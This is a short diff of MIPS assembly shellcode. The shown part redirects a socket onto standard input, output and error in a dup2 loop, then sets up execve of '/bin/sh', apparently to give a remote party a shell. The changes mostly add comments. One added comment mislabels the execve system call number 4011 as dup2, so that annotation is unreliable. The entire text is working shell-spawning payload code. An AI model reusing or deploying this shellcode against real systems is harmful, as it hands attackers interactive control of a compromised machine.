@@ -41,6 +41,7 @@ main:
 	# dup2(sockfd, 0)
  	# a0: oldfd (sockfd)
  	# a1: newfd (2, 1, 0)
+ 	# v0: syscall = __NR_dup2 (4063)
 	li      $s1, -3
 	nor     $s1, $s1, $zero
 	add     $a0, $s2, $zero
@@ -50,12 +51,13 @@ dup2_loop:
 	syscall 0x40404
 	li      $s0, -1
 	addi    $s1, $s1, -1
-	bne     $s1, $s0, dup2_loop	# <dup2_loop>
+	bne     $s1, $s0, dup2_loop # <dup2_loop>
 
 	# execve("/bin/sh", ["/bin/sh"], NULL)
 	# a0: filename "/bin/sh"
 	# a1: argv ["/bin/sh", NULL]
 	# a2: envp NULL
+	# v0: syscall = __NR_dup2 (4011)
 	li      $t8, -1         # load t8 with -1
 getaddr:                    # getaddr trick from scut@team-teso.net
 	bltzal  $t8, getaddr    # branch with $ra stored if t8 < 0
